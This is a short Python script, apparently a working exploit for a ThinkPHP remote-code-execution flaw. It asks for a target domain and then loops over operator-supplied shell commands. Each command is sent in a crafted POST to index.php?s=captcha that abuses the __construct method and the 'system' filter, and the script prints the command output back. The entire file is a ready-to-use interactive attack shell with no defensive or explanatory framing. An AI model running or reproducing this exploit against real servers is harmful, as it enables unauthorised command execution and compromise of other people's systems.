import requests
import re
print('请输入目标域名:')
domain = input('')
url = f'http://{domain}:8080/index.php?s=captcha'
while 1 :
    print('<System command>:')
    domain_sys = input('')
    domain_post = {
        "_method":"__construct",
        "filter[]":"system",
        "method":"get",
        f"server[REQUEST_METHOD]":{domain_sys}
    }
    rere = requests.post(url,data=domain_post)
    rere.encoding = ('utf-8')
    rebody = rere.text
    obj = re.compile(r'(?P<SYSecho>.*?)<!DOCTYPE html>',re.S)
    chuli = obj.finditer(rebody)
    for it in chuli :
        print(it.group('SYSecho'))